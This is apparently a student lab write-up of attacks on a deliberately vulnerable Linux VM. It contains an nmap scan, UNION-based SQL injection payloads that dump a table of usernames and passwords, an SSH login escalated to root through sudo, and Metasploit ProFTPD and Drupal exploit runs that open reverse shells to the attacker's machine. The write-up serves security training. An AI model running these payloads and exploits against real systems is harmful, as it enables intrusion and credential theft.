# Level 1 (Linux)

## nmap scan results

```
sudo nmap -A 10.0.2.3    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 11:49 CST
Nmap scan report for 10.0.2.3
Host is up (0.0029s latency).
Not shown: 991 filtered tcp ports (no-response)
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 2b:2e:1f:a4:54:26:87:76:12:26:59:58:0d:da:3b:04 (DSA)
|   2048 c9:ac:70:ef:f8:de:8b:a3:a3:44:ab:3d:32:0a:5c:6a (RSA)
|   256 c0:49:cc:18:7b:27:a4:07:0d:2a:0d:bb:42:4c:36:17 (ECDSA)
|_  256 a0:76:f3:76:f8:f0:70:4d:09:ca:e1:10:fd:a9:cc:0a (ED25519)
80/tcp   open   http        Apache httpd 2.4.7
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2020-10-29 19:37  chat/
| -     2011-07-27 20:17  drupal/
| 1.7K  2020-10-29 19:37  payroll_app.php
| -     2013-04-08 12:06  phpmyadmin/
|_
|_http-server-header: Apache/2.4.7 (Ubuntu)
445/tcp  open   netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
|_http-server-header: CUPS/1.7 IPP/2.1
|_http-title: Home - CUPS 1.7.2
| http-methods: 
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry 
|_/
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
8080/tcp open   http        Jetty 8.1.7.v20120910
|_http-server-header: Jetty(8.1.7.v20120910)
|_http-title: Error 404 - Not Found
8181/tcp closed intermapper
MAC Address: 08:00:27:BB:1E:0A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 3.2 - 4.14 (98%), Linux 3.8 - 3.16 (97%), Linux 3.10 - 4.11 (94%), Linux 3.13 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Linux 4.10 (94%), Linux 3.2 - 3.16 (94%), Linux 4.2 (94%), Linux 3.13 - 4.4 (93%), Linux 3.13 - 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Hosts: 127.0.2.1, SEC-NYCU-PMELIN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: sec-nycu-pmelin
|   NetBIOS computer name: SEC-NYCU-PMELIN\x00
|   Domain name: \x00
|   FQDN: sec-nycu-pmelin
|_  System time: 2025-12-06T03:49:47+00:00
| smb2-time: 
|   date: 2025-12-06T03:49:49
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 2s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   2.95 ms 10.0.2.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.87 seconds
```

## Attempt 1: sql injection and ssh

sql injection to get user `leia_organa`'s password, then ssh to the machine and escalate to root.

```sql
1.  try if simple sql injection works on http://10.0.0.16/payroll_app.php
' or 1=1 #

2. it works, now try to get the table names
' UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables #

obtains:
...
xonomy_term_data   
taxonomy_term_hierarchy   
taxonomy_vocabulary   
url_alias   
users   <- important!!
users_roles   
variable   
watchdog   
columns_priv
...

3. get column names from users table
' UNION SELECT column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users' #

obtains:
uid   
name   
pass   
mail   
theme   
signature   
signature_format   
created   
access   
login   
status   
timezone   
language   
picture   
init   
data   
username   <- important!!
first_name   
last_name   
password   <- important!!
salary


4. get username and password from users table
' UNION SELECT username, password, NULL, NULL FROM users #

obtains:

Username First Name Last Name Salary
leia_organa help_me_obiwan  
luke_skywalker like_my_father_beforeme  
han_solo nerf_herder  
artoo_detoo b00p_b33p  
c_three_pio Pr0t0c07  
ben_kenobi thats_no_m00n  
darth_vader Dark_syD3  
anakin_skywalker but_master:(  
jarjar_binks mesah_p@ssw0rd  
lando_calrissian @dm1n1str8r  
boba_fett mandalorian1  
jabba_hutt my_kinda_skum  
greedo hanSh0tF1rst  
chewbacca rwaaaaawr8  
kylo_ren Daddy_Issues2
```

```bash
(.venv) user@super:~/workspace/nycu-parallel-programing/HW6$ ssh leia_organa@10.0.0.16
The authenticity of host '10.0.0.16 (10.0.0.16)' can't be established.
ED25519 key fingerprint is SHA256:Rpy8shmBT8uIqZeMsZCG6N5gHXDNSWQ0tEgSgF7t/SM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.0.16' (ED25519) to the list of known hosts.
leia_organa@10.0.0.16's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

leia_organa@SEC-NYCU-PMELin:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
leia_organa@SEC-NYCU-PMELin:~$ sudo su
[sudo] password for leia_organa: 
root@SEC-NYCU-PMELin:/home/leia_organa# whoami
root
```

## Attempt 2: proftpd

```
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf exploit(unix/ftp/proftpd_modcopy_exec) > option
[-] Unknown command: option. Did you mean options? Run the help command for more details.
msf exploit(unix/ftp/proftpd_modcopy_exec) > options

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CHOST                       no        The local client address
   CPORT                       no        The local client port
   Proxies                     no        A proxy chain of format type:host:port[,type:host:por
                                         t][...]. Supported proxies: socks5, socks5h, sapni, h
                                         ttp, socks4
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/d
                                         ocs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.0.102       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5



View the full module info with the info, or info -d command.

msf exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 10.0.0.16
RHOSTS => 10.0.0.16
msf exploit(unix/ftp/proftpd_modcopy_exec) > run
[*] Started reverse TCP handler on 10.0.0.102:4444 
[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
[-] 10.0.0.16:80 - Exploit aborted due to failure: unknown: 10.0.0.16:21 - Failure copying PHP payload to website path, directory not writable?
[*] Exploit completed, but no session was created.
msf exploit(unix/ftp/proftpd_modcopy_exec) > options

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CHOST                       no        The local client address
   CPORT                       no        The local client port
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...].
                                          Supported proxies: socks5, socks5h, sapni, http, socks4
   RHOSTS     10.0.0.16        yes       The target host(s), see https://docs.metasploit.com/docs/usin
                                         g-metasploit/basics/using-metasploit.html
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.0.102       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5



View the full module info with the info, or info -d command.

msf exploit(unix/ftp/proftpd_modcopy_exec) > set TARGETURI /chat
TARGETURI => /chat
msf exploit(unix/ftp/proftpd_modcopy_exec) > run
[*] Started reverse TCP handler on 10.0.0.102:4444 
[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
[-] 10.0.0.16:80 - Exploit aborted due to failure: unknown: 10.0.0.16:21 - Failure copying PHP payload to website path, directory not writable?
[*] Exploit completed, but no session was created.
msf exploit(unix/ftp/proftpd_modcopy_exec) > set TARGETURI /drupal/
TARGETURI => /drupal/
msf exploit(unix/ftp/proftpd_modcopy_exec) > run
[*] Started reverse TCP handler on 10.0.0.102:4444 
[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
[-] 10.0.0.16:80 - Exploit aborted due to failure: unknown: 10.0.0.16:21 - Failure copying PHP payload to website path, directory not writable?
[*] Exploit completed, but no session was created.
msf exploit(unix/ftp/proftpd_modcopy_exec) > set TARGETURI /phpmyadmin/
TARGETURI => /phpmyadmin/
msf exploit(unix/ftp/proftpd_modcopy_exec) > run
[*] Started reverse TCP handler on 10.0.0.102:4444 
[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
[-] 10.0.0.16:80 - Exploit aborted due to failure: unknown: 10.0.0.16:21 - Failure copying PHP payload to website path, directory not writable?
[*] Exploit completed, but no session was created.
msf exploit(unix/ftp/proftpd_modcopy_exec) > set TARGETURI /
TARGETURI => /
msf exploit(unix/ftp/proftpd_modcopy_exec) > run
[*] Started reverse TCP handler on 10.0.0.102:4444 
[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
[-] 10.0.0.16:80 - Exploit aborted due to failure: unknown: 10.0.0.16:21 - Failure copying PHP payload to website path, directory not writable?
[*] Exploit completed, but no session was created.
msf exploit(unix/ftp/proftpd_modcopy_exec) > options

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   CHOST                       no        The local client address
   CPORT                       no        The local client port
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...].
                                          Supported proxies: socks5, socks5h, sapni, http, socks4
   RHOSTS     10.0.0.16        yes       The target host(s), see https://docs.metasploit.com/docs/usin
                                         g-metasploit/basics/using-metasploit.html
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.0.102       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5



View the full module info with the info, or info -d command.

msf exploit(unix/ftp/proftpd_modcopy_exec) > run
[*] Started reverse TCP handler on 10.0.0.102:4444 
[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
[-] 10.0.0.16:80 - Exploit aborted due to failure: unknown: 10.0.0.16:21 - Failure copying PHP payload to website path, directory not writable?
[*] Exploit completed, but no session was created.
msf exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
SITEPATH => /var/www/html
msf exploit(unix/ftp/proftpd_modcopy_exec) > run
[*] Started reverse TCP handler on 10.0.0.102:4444 
[*] 10.0.0.16:80 - 10.0.0.16:21 - Connected to FTP server
[*] 10.0.0.16:80 - 10.0.0.16:21 - Sending copy commands to FTP server
[*] 10.0.0.16:80 - Executing PHP payload /9N41B.php
[+] 10.0.0.16:80 - Deleted /var/www/html/9N41B.php
[*] Command shell session 3 opened (10.0.0.102:4444 -> 10.0.0.16:34782) at 2025-12-09 15:40:40 +0800
msf exploit(unix/ftp/proftpd_modcopy_exec) > sessions ls

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  3         shell cmd/unix               10.0.0.102:4444 -> 10.0.0.16:34782 (10.0.0.16)

msf exploit(unix/ftp/proftpd_modcopy_exec) > sessions -i 3
[*] Starting interaction with 3...

whoami
www-data


```

## Attempt 3: drupal
```
msf exploit(unix/webapp/drupal_coder_exec) > show options

Module options (exploit/unix/webapp/drupal_coder_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:
                                         port[,type:host:port][...]. Suppor
                                         ted proxies: socks4, socks5, socks
                                         5h, http, sapni
   RHOSTS                      yes       The target host(s), see https://do
                                         cs.metasploit.com/docs/using-metas
                                         ploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing con
                                         nections
   TARGETURI  /                yes       The target URI of the Drupal insta
                                         llation
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may b
                                     e specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(unix/webapp/drupal_coder_exec) > set TARGETURI /drupal
TARGETURI => /drupal
msf exploit(unix/webapp/drupal_coder_exec) > set RHOSTS 10.0.2.3RHOSTS => 10.0.2.3
msf exploit(unix/webapp/drupal_coder_exec) > exploit
[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Cleaning up: [ -f coder_upgrade.run.php ] && find . \! -name coder_upgrade.run.php -delete
[*] Command shell session 1 opened (10.0.2.15:4444 -> 10.0.2.3:37926) at 2025-12-06 13:25:48 +0800

whoami
www-data

```
